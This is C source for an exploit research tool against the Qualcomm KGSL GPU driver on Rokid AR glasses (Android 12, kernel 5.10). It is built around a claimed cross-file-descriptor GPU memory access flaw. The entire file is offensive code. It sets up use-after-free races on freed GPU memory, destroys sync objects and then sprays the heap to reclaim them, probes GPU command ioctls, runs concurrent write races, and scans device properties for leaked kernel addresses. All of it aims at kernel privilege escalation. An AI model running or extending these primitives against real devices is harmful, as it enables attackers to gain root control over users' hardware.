/*
 * KGSL Cross-FD Privilege Escalation Research v2
 * ================================================
 *
 * Target: Rokid AR Glasses (Android 12, Kernel 5.10.209, Adreno 621)
 *
 * Confirmed Vulnerability:
 * - Cross-FD GPU Memory Access: Different FDs can access same GPU memory
 * - mmap offset formula: (page_index + 1) * 0x1000
 *
 * Research Vectors:
 * 1. GPU Command Buffer Corruption
 * 2. DMA-BUF Export/Import for Cross-Process Attack
 * 3. Race Condition with GPUMEM_FREE during active mmap
 * 4. KGSL Timestamp Event corruption
 * 5. SyncSource object manipulation via GPU memory
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_privesc_v2 kgsl_privesc_v2.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/bpf.h>

// ============================================================================
// KGSL Definitions
// ============================================================================

#define KGSL_IOC_TYPE 0x09

// Memory allocation IOCTLs
#define IOCTL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_GPUMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE, 0x2F, struct kgsl_gpumem_alloc_id)
#define IOCTL_GPUMEM_FREE_ID _IOW(KGSL_IOC_TYPE, 0x30, struct kgsl_gpumem_free_id)
#define IOCTL_GPUMEM_GET_INFO _IOWR(KGSL_IOC_TYPE, 0x36, struct kgsl_gpumem_get_info)

// Sync source IOCTLs
#define IOCTL_SYNCSOURCE_CREATE _IOWR(KGSL_IOC_TYPE, 0x40, struct kgsl_syncsource_create)
#define IOCTL_SYNCSOURCE_DESTROY _IOW(KGSL_IOC_TYPE, 0x41, struct kgsl_syncsource_destroy)
#define IOCTL_SYNCSOURCE_CREATE_FENCE _IOWR(KGSL_IOC_TYPE, 0x42, struct kgsl_syncsource_create_fence)
#define IOCTL_SYNCSOURCE_SIGNAL_FENCE _IOWR(KGSL_IOC_TYPE, 0x43, struct kgsl_syncsource_signal_fence)

// Other IOCTLs
#define IOCTL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_GPU_AUX_COMMAND 0xc0200958
#define IOCTL_TIMESTAMP_EVENT _IOWR(KGSL_IOC_TYPE, 0x33, struct kgsl_timestamp_event)

// KGSL Properties
#define KGSL_PROP_VERSION 0x0C
#define KGSL_PROP_GPU_RESET_STAT 0x0F
#define KGSL_PROP_DEVICE_BITNESS 0x1B

// Memory flags
#define KGSL_MEMALIGN_SHIFT 16
#define KGSL_CACHEMODE_SHIFT 26
#define KGSL_CACHEMODE_WRITECOMBINE 0
#define KGSL_CACHEMODE_UNCACHED 1
#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000

// ============================================================================
// Structures
// ============================================================================

struct kgsl_gpumem_alloc_id
{
    unsigned int id;
    unsigned int flags;
    uint64_t size;
    uint64_t mmapsize;
    uint64_t gpuaddr;
};

struct kgsl_gpumem_free_id
{
    unsigned int id;
    unsigned int pad;
};

struct kgsl_gpumem_get_info
{
    uint64_t gpuaddr;
    unsigned int id;
    unsigned int flags;
    uint64_t size;
    uint64_t mmapsize;
    uint64_t useraddr;
};

struct kgsl_syncsource_create
{
    unsigned int id;
};

struct kgsl_syncsource_destroy
{
    unsigned int id;
};

struct kgsl_syncsource_create_fence
{
    unsigned int id;
    int fence_fd;
};

struct kgsl_syncsource_signal_fence
{
    unsigned int id;
    int fence_fd;
};

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

struct kgsl_timestamp_event
{
    int type;
    unsigned int timestamp;
    unsigned int context_id;
    void *priv;
    size_t len;
};

// ============================================================================
// Global State
// ============================================================================

static int kgsl_fd1 = -1;
static int kgsl_fd2 = -1;
static volatile int race_running = 0;
static volatile int race_hit = 0;
static sigjmp_buf jmp_env;
static volatile int sig_received = 0;

#define MAX_ALLOCS 256
struct
{
    unsigned int id;
    uint64_t gpuaddr;
    uint64_t size;
    void *ptr;
    int fd;
} allocs[MAX_ALLOCS];
static int alloc_count = 0;

// ============================================================================
// Signal Handler for Safe Memory Access
// ============================================================================

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read64(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    return -1;
}

int safe_write64(void *ptr, uint64_t val)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *(volatile uint64_t *)ptr = val;
        return 0;
    }
    return -1;
}

// ============================================================================
// Utility Functions
// ============================================================================

void hexdump(const char *desc, const void *data, size_t size)
{
    printf("%s (%zu bytes):\n", desc, size);
    const uint8_t *p = (const uint8_t *)data;
    for (size_t i = 0; i < size; i++)
    {
        if (i % 32 == 0)
            printf("  %04zx: ", i);
        printf("%02x", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
        else if ((i + 1) % 8 == 0)
            printf(" ");
    }
    if (size % 32 != 0)
        printf("\n");
}

uint64_t get_time_us(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000000ULL + ts.tv_nsec / 1000;
}

// ============================================================================
// GPU Memory Operations
// ============================================================================

int gpumem_alloc_id(int fd, uint64_t size, unsigned int flags,
                    unsigned int *id_out, uint64_t *gpuaddr_out)
{
    struct kgsl_gpumem_alloc_id req = {0};
    req.size = size;
    req.flags = flags | (12 << KGSL_MEMALIGN_SHIFT); // 4KB alignment

    int ret = ioctl(fd, IOCTL_GPUMEM_ALLOC_ID, &req);
    if (ret == 0)
    {
        if (id_out)
            *id_out = req.id;
        if (gpuaddr_out)
            *gpuaddr_out = req.gpuaddr;
    }
    return ret;
}

int gpumem_free_id(int fd, unsigned int id)
{
    struct kgsl_gpumem_free_id req = {.id = id};
    return ioctl(fd, IOCTL_GPUMEM_FREE_ID, &req);
}

void *gpumem_mmap_id(int fd, unsigned int id, uint64_t size)
{
    off_t offset = (off_t)id << 12;
    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);
}

void *gpumem_mmap_gpuaddr(int fd, uint64_t gpuaddr, uint64_t size)
{
    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, gpuaddr);
}

// Cross-FD mmap using the discovered offset formula
void *gpumem_cross_fd_mmap(int fd, uint64_t target_gpuaddr, uint64_t size)
{
    // offset = (page_index + 1) * 0x1000
    uint64_t page_index = (target_gpuaddr - 0x4000000000ULL) / 0x1000;
    off_t offset = (page_index + 1) * 0x1000;
    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);
}

// ============================================================================
// Attack Vector 1: GPU Memory Free Race
// ============================================================================

/*
 * Theory:
 * 1. fd1 allocates GPU memory and mmaps it
 * 2. fd2 also mmaps the same memory via cross-fd
 * 3. fd1 frees the memory
 * 4. fd2's mapping should become invalid, but might still be accessible
 * 5. If accessible, we have a UAF primitive in GPU memory space
 */

static volatile int free_done = 0;
static volatile int access_result = 0;
static uint64_t target_gpuaddr = 0;
static unsigned int target_id = 0;

void *free_thread(void *arg)
{
    usleep(100); // Small delay
    gpumem_free_id(kgsl_fd1, target_id);
    free_done = 1;
    return NULL;
}

void test_free_race(void)
{
    printf("\n=== Attack Vector 1: GPU Memory Free Race ===\n");

    unsigned int id;
    uint64_t gpuaddr;

    // Allocate via fd1
    if (gpumem_alloc_id(kgsl_fd1, 0x1000, 0, &id, &gpuaddr) < 0)
    {
        printf("[-] fd1 alloc failed\n");
        return;
    }
    printf("[+] fd1 alloc: id=%u, gpuaddr=0x%lx\n", id, gpuaddr);

    // mmap via fd1
    void *ptr1 = gpumem_mmap_id(kgsl_fd1, id, 0x1000);
    if (ptr1 == MAP_FAILED)
    {
        printf("[-] fd1 mmap failed\n");
        gpumem_free_id(kgsl_fd1, id);
        return;
    }

    // Write marker
    *(volatile uint64_t *)ptr1 = 0xDEADBEEFCAFEBABEULL;
    printf("[+] fd1 mmap at %p, wrote marker\n", ptr1);

    // Cross-FD mmap via fd2
    void *ptr2 = gpumem_cross_fd_mmap(kgsl_fd2, gpuaddr, 0x1000);
    if (ptr2 == MAP_FAILED)
    {
        printf("[-] fd2 cross-fd mmap failed: %s\n", strerror(errno));

        // fd2 needs its own allocation first
        unsigned int id2;
        uint64_t gpuaddr2;
        if (gpumem_alloc_id(kgsl_fd2, 0x1000, 0, &id2, &gpuaddr2) >= 0)
        {
            printf("[*] fd2 allocated id=%u to enable mmap\n", id2);
            ptr2 = gpumem_cross_fd_mmap(kgsl_fd2, gpuaddr, 0x1000);
        }
    }

    if (ptr2 != MAP_FAILED)
    {
        uint64_t val;
        if (safe_read64(ptr2, &val) == 0)
        {
            printf("[+] fd2 read before free: 0x%lx\n", val);
        }

        // Now free via fd1 and check if fd2 can still access
        target_id = id;
        target_gpuaddr = gpuaddr;
        free_done = 0;

        pthread_t th;
        pthread_create(&th, NULL, free_thread, NULL);

        // Rapid access loop
        int uaf_count = 0;
        for (int i = 0; i < 10000 && !free_done; i++)
        {
            uint64_t v;
            if (safe_read64(ptr2, &v) == 0)
            {
                uaf_count++;
            }
        }

        pthread_join(th, NULL);

        // Check access after free
        printf("[*] Access attempts during free: %d\n", uaf_count);

        uint64_t post_free;
        if (safe_read64(ptr2, &post_free) == 0)
        {
            printf("[!!!] POST-FREE READ SUCCESS: 0x%lx\n", post_free);
            if (post_free != 0xDEADBEEFCAFEBABEULL)
            {
                printf("[!!!] Value changed - memory may be reused!\n");
            }
        }
        else
        {
            printf("[*] Post-free read failed (expected - mapping invalidated)\n");
        }

        munmap(ptr2, 0x1000);
    }

    munmap(ptr1, 0x1000);
}

// ============================================================================
// Attack Vector 2: SyncSource + GPU Memory Race
// ============================================================================

/*
 * Theory:
 * 1. Create syncsource objects rapidly
 * 2. Use GPU memory allocation to spray and potentially overlap
 * 3. Destroy syncsource while GPU memory still references it
 */

void test_syncsource_spray(void)
{
    printf("\n=== Attack Vector 2: SyncSource + GPU Memory Spray ===\n");

#define NUM_SYNCS 64
    unsigned int sync_ids[NUM_SYNCS];
    int sync_count = 0;

    // Create many syncsources
    for (int i = 0; i < NUM_SYNCS; i++)
    {
        struct kgsl_syncsource_create req = {0};
        if (ioctl(kgsl_fd1, IOCTL_SYNCSOURCE_CREATE, &req) == 0)
        {
            sync_ids[sync_count++] = req.id;
        }
    }
    printf("[+] Created %d syncsources\n", sync_count);

    // Create fences for some syncsources
    int fence_fds[NUM_SYNCS];
    int fence_count = 0;
    for (int i = 0; i < sync_count && i < 16; i++)
    {
        struct kgsl_syncsource_create_fence req = {.id = sync_ids[i]};
        if (ioctl(kgsl_fd1, IOCTL_SYNCSOURCE_CREATE_FENCE, &req) == 0)
        {
            fence_fds[fence_count++] = req.fence_fd;
            printf("[+] Fence fd=%d for syncsource %u\n", req.fence_fd, sync_ids[i]);
        }
    }

    // Now destroy syncsources but keep fences
    printf("[*] Destroying syncsources while fences still exist...\n");
    for (int i = 0; i < sync_count; i++)
    {
        struct kgsl_syncsource_destroy req = {.id = sync_ids[i]};
        ioctl(kgsl_fd1, IOCTL_SYNCSOURCE_DESTROY, &req);
    }

    // Spray GPU memory to reclaim syncsource memory
    printf("[*] Spraying GPU memory...\n");
#define SPRAY_SIZE 128 // Approximate syncsource size
#define SPRAY_COUNT 256

    unsigned int spray_ids[SPRAY_COUNT];
    void *spray_ptrs[SPRAY_COUNT];
    int spray_success = 0;

    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        unsigned int id;
        uint64_t gpuaddr;
        if (gpumem_alloc_id(kgsl_fd1, SPRAY_SIZE, 0, &id, &gpuaddr) == 0)
        {
            void *ptr = gpumem_mmap_id(kgsl_fd1, id, SPRAY_SIZE);
            if (ptr != MAP_FAILED)
            {
                // Fill with pattern
                memset(ptr, 0x41, SPRAY_SIZE);
                ((uint64_t *)ptr)[0] = 0xAAAABBBBCCCCDDDDULL | i;
                spray_ids[spray_success] = id;
                spray_ptrs[spray_success] = ptr;
                spray_success++;
            }
        }
    }
    printf("[+] Sprayed %d GPU memory objects\n", spray_success);

    // Now try to signal the dangling fences
    printf("[*] Attempting to signal dangling fences...\n");
    for (int i = 0; i < fence_count; i++)
    {
        struct kgsl_syncsource_signal_fence req = {
            .id = sync_ids[i], // Use original syncsource ID (now destroyed)
            .fence_fd = fence_fds[i]};
        int ret = ioctl(kgsl_fd1, IOCTL_SYNCSOURCE_SIGNAL_FENCE, &req);
        if (ret == 0)
        {
            printf("[!!!] SIGNAL SUCCESS on destroyed syncsource %u!\n", sync_ids[i]);
        }
        close(fence_fds[i]);
    }

    // Check if spray objects were corrupted
    printf("[*] Checking spray objects for corruption...\n");
    for (int i = 0; i < spray_success; i++)
    {
        uint64_t expected = 0xAAAABBBBCCCCDDDDULL | i;
        uint64_t actual;
        if (safe_read64(spray_ptrs[i], &actual) == 0)
        {
            if (actual != expected)
            {
                printf("[!!!] CORRUPTION at spray[%d]: expected 0x%lx, got 0x%lx\n",
                       i, expected, actual);
            }
        }
        munmap(spray_ptrs[i], SPRAY_SIZE);
        gpumem_free_id(kgsl_fd1, spray_ids[i]);
    }
}

// ============================================================================
// Attack Vector 3: BPF + KGSL Combined Attack
// ============================================================================

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static int bpf_create_map(int map_type, int key_size, int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_map(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = BPF_ANY,
    };
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

void test_bpf_kgsl_combined(void)
{
    printf("\n=== Attack Vector 3: BPF + KGSL Combined ===\n");

// Create BPF maps of various sizes
#define BPF_MAP_COUNT 32
#define BPF_VALUE_SIZES_COUNT 4
    int value_sizes[] = {64, 128, 192, 256};
    int bpf_fds[BPF_MAP_COUNT];
    int bpf_count = 0;

    for (int s = 0; s < BPF_VALUE_SIZES_COUNT; s++)
    {
        for (int i = 0; i < BPF_MAP_COUNT / BPF_VALUE_SIZES_COUNT; i++)
        {
            int fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), value_sizes[s], 256);
            if (fd >= 0)
            {
                bpf_fds[bpf_count++] = fd;
            }
        }
    }
    printf("[+] Created %d BPF maps\n", bpf_count);

    // Allocate KGSL memory matching BPF value sizes
    printf("[*] Allocating KGSL memory matching BPF sizes...\n");

    for (int s = 0; s < BPF_VALUE_SIZES_COUNT; s++)
    {
        unsigned int id;
        uint64_t gpuaddr;
        if (gpumem_alloc_id(kgsl_fd1, value_sizes[s], 0, &id, &gpuaddr) == 0)
        {
            void *ptr = gpumem_mmap_id(kgsl_fd1, id, value_sizes[s]);
            if (ptr != MAP_FAILED)
            {
                printf("[+] KGSL alloc size=%d, id=%u, gpuaddr=0x%lx, ptr=%p\n",
                       value_sizes[s], id, gpuaddr, ptr);

                // Write pattern
                memset(ptr, 0x42, value_sizes[s]);
                *(uint64_t *)ptr = 0xABCD000000000000ULL | id;

                // Cross-fd access
                void *ptr2 = gpumem_cross_fd_mmap(kgsl_fd2, gpuaddr, value_sizes[s]);
                if (ptr2 != MAP_FAILED)
                {
                    uint64_t val;
                    if (safe_read64(ptr2, &val) == 0)
                    {
                        printf("    [+] Cross-FD read: 0x%lx\n", val);
                    }
                    munmap(ptr2, value_sizes[s]);
                }

                munmap(ptr, value_sizes[s]);
            }
            gpumem_free_id(kgsl_fd1, id);
        }
    }

    // Clean up BPF maps
    for (int i = 0; i < bpf_count; i++)
    {
        close(bpf_fds[i]);
    }
}

// ============================================================================
// Attack Vector 4: GPU AUX Command Injection
// ============================================================================

void test_gpu_aux_command(void)
{
    printf("\n=== Attack Vector 4: GPU AUX Command Analysis ===\n");

    // Allocate GPU memory for command buffer
    unsigned int id;
    uint64_t gpuaddr;
    if (gpumem_alloc_id(kgsl_fd1, 0x10000, 0, &id, &gpuaddr) < 0)
    {
        printf("[-] Cannot allocate command buffer\n");
        return;
    }

    void *cmd_buf = gpumem_mmap_id(kgsl_fd1, id, 0x10000);
    if (cmd_buf == MAP_FAILED)
    {
        printf("[-] Cannot mmap command buffer\n");
        gpumem_free_id(kgsl_fd1, id);
        return;
    }

    printf("[+] Command buffer: id=%u, gpuaddr=0x%lx, ptr=%p\n", id, gpuaddr, cmd_buf);

    // Try to understand GPU_AUX_COMMAND structure
    // IOCTL 0xc0200958 takes a 32-byte (0x20) structure

    struct
    {
        uint64_t gpuaddr; // GPU address of command buffer
        uint64_t size;    // Size of command data
        uint32_t flags;   // Command flags
        uint32_t type;    // Command type
    } aux_cmd;

    // Write some command patterns
    memset(cmd_buf, 0, 0x100);

    // Try different command types
    for (int type = 0; type < 8; type++)
    {
        aux_cmd.gpuaddr = gpuaddr;
        aux_cmd.size = 64;
        aux_cmd.flags = 0;
        aux_cmd.type = type;

        int ret = ioctl(kgsl_fd1, IOCTL_GPU_AUX_COMMAND, &aux_cmd);
        printf("[*] GPU_AUX_COMMAND type=%d: ret=%d, errno=%d (%s)\n",
               type, ret, errno, strerror(errno));
    }

    munmap(cmd_buf, 0x10000);
    gpumem_free_id(kgsl_fd1, id);
}

// ============================================================================
// Attack Vector 5: Cross-FD Double-Write Race
// ============================================================================

static void *ptr_fd1 = NULL;
static void *ptr_fd2 = NULL;
static volatile int write_count = 0;
static volatile int corruption_detected = 0;

void *writer_thread1(void *arg)
{
    uint64_t pattern = 0xAAAAAAAAAAAAAAAAULL;
    while (race_running)
    {
        if (ptr_fd1)
        {
            *(volatile uint64_t *)ptr_fd1 = pattern;
            __sync_fetch_and_add(&write_count, 1);
        }
    }
    return NULL;
}

void *writer_thread2(void *arg)
{
    uint64_t pattern = 0x5555555555555555ULL;
    while (race_running)
    {
        if (ptr_fd2)
        {
            *(volatile uint64_t *)ptr_fd2 = pattern;
            __sync_fetch_and_add(&write_count, 1);
        }
    }
    return NULL;
}

void *checker_thread(void *arg)
{
    while (race_running)
    {
        if (ptr_fd1 && ptr_fd2)
        {
            uint64_t v1 = *(volatile uint64_t *)ptr_fd1;
            uint64_t v2 = *(volatile uint64_t *)ptr_fd2;

            // Check for torn reads (partial updates)
            if (v1 != 0xAAAAAAAAAAAAAAAAULL && v1 != 0x5555555555555555ULL)
            {
                printf("[!!!] TORN READ fd1: 0x%lx\n", v1);
                corruption_detected++;
            }
            if (v2 != 0xAAAAAAAAAAAAAAAAULL && v2 != 0x5555555555555555ULL)
            {
                printf("[!!!] TORN READ fd2: 0x%lx\n", v2);
                corruption_detected++;
            }
        }
    }
    return NULL;
}

void test_double_write_race(void)
{
    printf("\n=== Attack Vector 5: Cross-FD Double-Write Race ===\n");

    // Allocate via fd1
    unsigned int id1;
    uint64_t gpuaddr1;
    if (gpumem_alloc_id(kgsl_fd1, 0x1000, 0, &id1, &gpuaddr1) < 0)
    {
        printf("[-] fd1 alloc failed\n");
        return;
    }

    // fd2 needs its own allocation
    unsigned int id2;
    uint64_t gpuaddr2;
    gpumem_alloc_id(kgsl_fd2, 0x1000, 0, &id2, &gpuaddr2);

    ptr_fd1 = gpumem_mmap_id(kgsl_fd1, id1, 0x1000);
    if (ptr_fd1 == MAP_FAILED)
    {
        printf("[-] fd1 mmap failed\n");
        gpumem_free_id(kgsl_fd1, id1);
        return;
    }

    ptr_fd2 = gpumem_cross_fd_mmap(kgsl_fd2, gpuaddr1, 0x1000);
    if (ptr_fd2 == MAP_FAILED)
    {
        printf("[-] fd2 cross-fd mmap failed\n");
        munmap(ptr_fd1, 0x1000);
        gpumem_free_id(kgsl_fd1, id1);
        return;
    }

    printf("[+] fd1 mmap: %p, fd2 cross-fd mmap: %p\n", ptr_fd1, ptr_fd2);

    // Start race threads
    race_running = 1;
    write_count = 0;
    corruption_detected = 0;

    pthread_t t1, t2, t3;
    pthread_create(&t1, NULL, writer_thread1, NULL);
    pthread_create(&t2, NULL, writer_thread2, NULL);
    pthread_create(&t3, NULL, checker_thread, NULL);

    sleep(2);
    race_running = 0;

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);

    printf("[*] Total writes: %d\n", write_count);
    printf("[*] Corruptions detected: %d\n", corruption_detected);

    munmap(ptr_fd1, 0x1000);
    munmap(ptr_fd2, 0x1000);
    gpumem_free_id(kgsl_fd1, id1);
    gpumem_free_id(kgsl_fd2, id2);

    ptr_fd1 = NULL;
    ptr_fd2 = NULL;
}

// ============================================================================
// Attack Vector 6: KGSL Info Leak via Properties
// ============================================================================

void test_info_leak(void)
{
    printf("\n=== Attack Vector 6: KGSL Property Info Leak ===\n");

    // Properties that might leak kernel addresses
    unsigned int props[] = {
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
        0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20};

    for (int i = 0; i < sizeof(props) / sizeof(props[0]); i++)
    {
        uint8_t buf[256] = {0};
        struct kgsl_device_getproperty req = {
            .type = props[i],
            .value = buf,
            .sizebytes = sizeof(buf)};

        int ret = ioctl(kgsl_fd1, IOCTL_DEVICE_GETPROPERTY, &req);
        if (ret == 0)
        {
            printf("[+] Property 0x%02x:\n", props[i]);

            // Check for kernel-like addresses
            uint64_t *vals = (uint64_t *)buf;
            for (int j = 0; j < 32; j++)
            {
                if ((vals[j] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
                {
                    printf("    [!] Possible kernel addr at +%d: 0x%lx\n", j * 8, vals[j]);
                }
            }

            // Print first 64 bytes
            hexdump("    ", buf, 64);
        }
    }
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Cross-FD Privilege Escalation Research v2               ║\n");
    printf("║  Target: Rokid AR Glasses (Kernel 5.10.209, Adreno 621)       ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    // Setup signal handlers
    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    // Open two KGSL file descriptors
    kgsl_fd1 = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd1 < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] fd1 = %d\n", kgsl_fd1);

    kgsl_fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd2 < 0)
    {
        printf("[-] Cannot open second fd: %s\n", strerror(errno));
        close(kgsl_fd1);
        return 1;
    }
    printf("[+] fd2 = %d\n", kgsl_fd2);

    // Run attack vectors
    test_free_race();
    test_syncsource_spray();
    test_bpf_kgsl_combined();
    test_gpu_aux_command();
    test_double_write_race();
    test_info_leak();

    printf("\n=== Research Complete ===\n");

    close(kgsl_fd1);
    close(kgsl_fd2);

    return 0;
}
